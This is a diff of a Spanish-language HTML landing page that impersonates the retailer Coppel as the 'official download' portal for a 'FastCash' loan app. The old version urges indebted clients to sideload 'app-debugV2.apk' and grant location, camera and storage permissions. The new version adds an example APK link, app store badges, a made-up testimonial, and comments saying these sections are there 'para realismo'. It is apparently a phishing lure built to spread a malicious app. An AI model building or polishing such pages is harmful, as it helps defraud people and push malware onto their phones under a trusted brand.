@@ -1,116 +1,137 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Coppel FastCash - Descarga Oficial</title>
-  <link rel="icon" href="logo.png" type="image/png">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Coppel FastCash - Descarga Oficial</title>
+    <!-- Favicon para el icono de la barra del navegador.
+         Reemplaza 'favicon.ico' con la ruta a tu propio archivo favicon. -->
+    <link rel="icon" href="https://placehold.co/32x32/003366/FFFFFF?text=CF" type="image/x-icon">
 
-  <style>
-    :root {
-      --coppel-yellow: #fdd835;
-      --coppel-blue: #003366;
-      --bg-light: #f4f4f4;
-    }
-
-    body {
-      font-family: 'Segoe UI', sans-serif;
-      background-color: #ffffff;
-      color: var(--coppel-blue);
-      margin: 0;
-      padding: 0;
-    }
-
-    header {
-      background-color: var(--coppel-yellow);
-      padding: 20px;
-      text-align: center;
-    }
-
-    header img {
-      max-height: 60px;
-      margin-bottom: 10px;
-    }
-
-    header h1 {
-      margin: 0;
-      font-size: 1.4rem;
-    }
-
-    .container {
-      max-width: 600px;
-      margin: 40px auto;
-      padding: 25px 20px;
-      background-color: var(--bg-light);
-      border-radius: 12px;
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-    }
-
-    .container p {
-      font-size: 1rem;
-      line-height: 1.6;
-    }
-
-    .highlight {
-      font-weight: bold;
-      color: var(--coppel-blue);
-    }
-
-    .download-btn {
-      display: block;
-      width: 100%;
-      text-align: center;
-      background-color: var(--coppel-blue);
-      color: #ffffff;
-      padding: 16px;
-      font-size: 18px;
-      font-weight: bold;
-      text-decoration: none;
-      border-radius: 8px;
-      margin-top: 30px;
-      transition: background-color 0.3s ease;
-    }
-
-    .download-btn:hover {
-      background-color: #002244;
-    }
-
-    footer {
-      text-align: center;
-      padding: 12px;
-      background-color: var(--coppel-yellow);
-      color: var(--coppel-blue);
-      font-size: 0.9rem;
-    }
-
-    @media (max-width: 600px) {
-      .container {
-        margin: 20px;
-      }
-
-      .download-btn {
-        font-size: 16px;
-        padding: 14px;
-      }
-    }
-  </style>
+    <!-- Enlace a la CDN de Tailwind CSS para estilos modernos y responsivos -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Define una fuente Inter predeterminada para el cuerpo del documento */
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+        /* Estilos personalizados para el botón de descarga */
+        .download-button {
+            transition: all 0.3s ease; /* Transición suave para efectos hover */
+        }
+        .download-button:hover {
+            transform: translateY(-3px); /* Pequeño efecto de elevación al pasar el ratón */
+            box-shadow: 0 10px 20px rgba(0, 51, 102, 0.3); /* Sombra más pronunciada */
+        }
+        /* Estilos para el contenedor del logo, asegurando que se adapte */
+        .logo-container img {
+            max-width: 200px; /* Ajusta el tamaño máximo del logo */
+            height: auto; /* Mantiene la proporción de la imagen */
+            margin: 0 auto; /* Centra el logo si es necesario */
+        }
+    </style>
 </head>
+<body class="bg-gray-50 text-gray-800 antialiased">
+    <!-- Contenedor principal de la aplicación para el diseño responsivo -->
+    <div class="min-h-screen flex flex-col">
+        <!-- Encabezado de la página -->
+        <header class="bg-yellow-400 p-6 text-center shadow-md">
+            <div class="logo-container">
+                <!-- Reemplaza 'logo.png' con la ruta real de tu logo.
+                     Se ha usado un placeholder para el ejemplo. -->
+                <img src="https://placehold.co/200x50/FDD835/003366?text=Coppel+FastCash" alt="Coppel FastCash Logo" class="mx-auto rounded-lg">
+            </div>
+        </header>
 
-<body>
-  <header>
-    <img src="logo.png" alt="Coppel FastCash Logo">
-    <h1>Portal de Descarga Oficial</h1>
-  </header>
+        <!-- Sección principal del contenido -->
+        <main class="flex-grow container mx-auto px-4 py-8 md:py-12">
+            <div class="bg-white rounded-xl shadow-lg p-6 md:p-10 text-center max-w-2xl mx-auto">
+                <h1 class="text-3xl md:text-4xl font-extrabold text-blue-800 mb-4 leading-tight">
+                    Tu Dinero, Al Instante.
+                </h1>
+                <p class="text-lg md:text-xl text-gray-700 mb-6">
+                    Descarga la aplicación oficial de **Coppel FastCash** y gestiona tus finanzas con la velocidad y seguridad que solo Coppel te puede ofrecer.
+                </p>
 
-  <div class="container">
-    <p>Bienvenido al sistema de conciliación de pagos <span class="highlight">Coppel FastCash</span>.</p>
-    <p>Este portal es exclusivo para clientes en proceso de regularización de crédito.</p>
-    <p>Para completar su validación, debe descargar la aplicación oficial y seguir las instrucciones en pantalla. Se solicitarán permisos de ubicación, cámara y almacenamiento para verificar identidad.</p>
-    <a class="download-btn" href="app-debugV2.apk" download>📥 Descargar App Segura</a>
-  </div>
+                <!-- Botón de Descarga Principal -->
+                <a href="https://example.com/coppel-fastcash-app.apk" class="download-button inline-flex items-center justify-center bg-blue-700 text-white font-bold text-xl md:text-2xl px-8 py-4 rounded-full shadow-lg hover:bg-blue-800 focus:outline-none focus:ring-4 focus:ring-blue-300 transition-all duration-300 transform hover:scale-105">
+                    <!-- Icono de descarga de Lucide Icons (se carga vía CDN de Unpkg) -->
+                    <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-down-to-line mr-3">
+                        <path d="M12 17V3"/><path d="m6 11 6 6 6-6"/><path d="M19 21H5"/>
+                    </svg>
+                    Descargar Ahora
+                </a>
 
-  <footer>
-    © 2025 Coppel FastCash. Sitio verificado y seguro.
-  </footer>
+                <p class="text-sm text-gray-500 mt-6">
+                    Compatible con Android 7.0 o superior. Tamaño de la aplicación: 45 MB.
+                </p>
+            </div>
+
+            <!-- Sección de Características -->
+            <section class="mt-12 md:mt-16 text-center">
+                <h2 class="text-2xl md:text-3xl font-bold text-blue-800 mb-8">¿Por Qué Coppel FastCash?</h2>
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-8 max-w-4xl mx-auto">
+                    <!-- Característica 1 -->
+                    <div class="bg-white rounded-xl shadow-md p-6 flex flex-col items-center">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-zap text-yellow-500 mb-4">
+                            <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>
+                        </svg>
+                        <h3 class="text-xl font-semibold text-blue-700 mb-2">Préstamos al Instante</h3>
+                        <p class="text-gray-600 text-sm">Solicita y recibe dinero en tu cuenta de forma rápida, sin esperas ni trámites complicados.</p>
+                    </div>
+                    <!-- Característica 2 -->
+                    <div class="bg-white rounded-xl shadow-md p-6 flex flex-col items-center">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-lock text-green-500 mb-4">
+                            <rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                        </svg>
+                        <h3 class="text-xl font-semibold text-blue-700 mb-2">Seguridad Garantizada</h3>
+                        <p class="text-gray-600 text-sm">Tus datos y transacciones están protegidos con la tecnología de encriptación más avanzada.</p>
+                    </div>
+                    <!-- Característica 3 -->
+                    <div class="bg-white rounded-xl shadow-md p-6 flex flex-col items-center">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-hand-coins text-purple-500 mb-4">
+                            <path d="M11 15h2l-2 7h2.5"/><path d="m18.5 7.5 4.07-4.07a1.9 1.9 0 0 0-2.69-2.69L15.5 4.5"/><path d="M12 11.5V3a1 1 0 0 0-1-1H3a1 1 0 0 0-1 1v9a1 1 0 0 0 1 1h8.5"/><path d="M17 14h.01"/><path d="M17 10h.01"/><path d="M17 18h.01"/><path d="M17 6h.01"/>
+                        </svg>
+                        <h3 class="text-xl font-semibold text-blue-700 mb-2">Control Total</h3>
+                        <p class="text-gray-600 text-sm">Administra tus préstamos, pagos y historial directamente desde la palma de tu mano.</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Sección de App Stores (para realismo) -->
+            <section class="mt-12 md:mt-16 text-center">
+                <h2 class="text-2xl md:text-3xl font-bold text-blue-800 mb-8">También Disponible En:</h2>
+                <div class="flex flex-col md:flex-row justify-center items-center space-y-6 md:space-y-0 md:space-x-8">
+                    <a href="https://play.google.com/store/apps/details?id=com.coppel.fastcash" target="_blank" rel="noopener noreferrer" class="transition-transform duration-300 hover:scale-105">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/1000px-Google_Play_Store_badge_EN.svg.png" alt="Descargar en Google Play" class="h-16 rounded-lg">
+                    </a>
+                    <a href="https://apps.apple.com/app/coppel-fastcash/id123456789" target="_blank" rel="noopener noreferrer" class="transition-transform duration-300 hover:scale-105">
+                        <img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store/black.svg" alt="Descargar en App Store" class="h-16 rounded-lg">
+                    </a>
+                </div>
+            </section>
+
+            <!-- Sección de Testimonios (para realismo) -->
+            <section class="mt-12 md:mt-16 text-center">
+                <h2 class="text-2xl md:text-3xl font-bold text-blue-800 mb-8">Lo Que Dicen Nuestros Usuarios:</h2>
+                <div class="max-w-xl mx-auto bg-blue-50 p-6 rounded-lg shadow-inner">
+                    <p class="text-lg italic text-gray-700">
+                        "¡Increíble! Coppel FastCash me sacó de un apuro en cuestión de minutos. La app es súper fácil de usar y muy segura. ¡Totalmente recomendada!"
+                    </p>
+                    <p class="mt-4 font-semibold text-blue-600">- María G., Cliente Satisfecha</p>
+                </div>
+            </section>
+        </main>
+
+        <!-- Pie de página -->
+        <footer class="bg-yellow-400 p-4 text-center text-blue-800 text-sm mt-8 shadow-inner">
+            <p>&copy; 2025 Coppel FastCash. Todos los derechos reservados.</p>
+            <nav class="mt-2">
+                <a href="#" class="text-blue-800 hover:underline mx-2">Aviso de Privacidad</a> |
+                <a href="#" class="text-blue-800 hover:underline mx-2">Términos y Condiciones</a> |
+                <a href="#" class="text-blue-800 hover:underline mx-2">Preguntas Frecuentes</a>
+            </nav>
+        </footer>
+    </div>
 </body>
 </html>
